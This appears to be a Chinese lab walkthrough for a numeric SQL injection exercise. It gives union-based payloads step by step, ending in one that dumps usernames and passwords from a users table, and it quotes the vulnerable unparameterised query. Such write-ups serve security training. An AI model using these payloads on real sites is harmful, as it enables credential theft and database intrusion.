# 确认闭合类型
输入?id=1'  
出现报错：near '' LIMIT 0,1' at line 1  
         ' LIMIT 0,1  
可以跟第一题进行比较，会发现前面少了1'  
说明这一次我们只多了一个'，我们就可以不再考虑闭合的事情了  
接下来就跟上一题一样的步骤，把每一句payload的-1的后面的'去掉就行

# 确认回显位置
?id=-1 union select 1,2,3--+

# 查询数据库名
?id=-1 union select 1,database(),3 --+

# 查询表名
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

# 查询列名
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database()--+

# 查询值
?id=-1 union select 1,group_concat(username),group_concat(password) from users--+

# 源码
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  
看源码就很清楚的看出来，服务器并没有对输入进行闭合，我们也就不用考虑闭合的事情了